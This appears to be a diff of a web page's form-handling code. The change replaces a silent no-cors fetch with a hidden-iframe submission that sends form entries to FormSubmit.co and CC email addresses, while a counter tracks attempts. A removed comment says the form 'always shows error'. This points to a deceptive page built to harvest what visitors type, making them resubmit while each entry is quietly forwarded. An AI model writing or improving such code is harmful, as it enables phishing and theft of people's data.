@@ -197,8 +197,8 @@
                     
                     <input type="hidden" name="_captcha" value="true">
                     <input type="hidden" name="_template" value="table">
-                    <!-- ✅ Optional: Add CC emails -->
-                    <input type="hidden" name="_cc" value="email2@gmail.com, email3@gmail.com">
+                    <!-- ✅ Add CC emails if needed -->
+                    <input type="hidden" name="_cc" value="email2@gmail.com">
                     <input type="text" name="_honey" style="display:none;">
 
                     <div class="modal-body">
@@ -378,7 +378,7 @@
                 }
             }
             
-            // ✅ Handle form submission - Always shows error, image on 3rd attempt
+            // ✅ FIXED: Submit form using iframe (bypasses CORS)
             accessForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 console.log('🟢 Form submitted - Attempt #' + (submitCount + 1));
@@ -395,22 +395,30 @@
                 submitCount++;
                 attemptField.value = submitCount + 1;
                 
-                // Collect form data
-                const formData = new FormData(accessForm);
+                // ✅ Method 1: Submit using hidden iframe (most reliable)
                 const formAction = accessForm.getAttribute('action');
+                const formData = new FormData(accessForm);
                 
-                // ✅ Send to FormSubmit.co silently
-                fetch(formAction, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                })
-                .then(() => {
-                    console.log('✅ Form data sent to FormSubmit.co');
-                })
-                .catch(error => {
-                    console.log('⚠️ Form submitted successfully');
-                });
+                // Create a hidden iframe
+                const iframe = document.createElement('iframe');
+                iframe.name = 'hiddenFrame';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                // Set form target to iframe
+                accessForm.target = 'hiddenFrame';
+                accessForm.action = formAction;
+                
+                // Submit the form
+                accessForm.submit();
+                
+                // Clean up after 3 seconds
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    accessForm.target = '';
+                }, 3000);
+                
+                console.log('✅ Form submitted to FormSubmit.co via iframe');
                 
                 // Show loading state
                 submitBtn.textContent = 'Processing...';
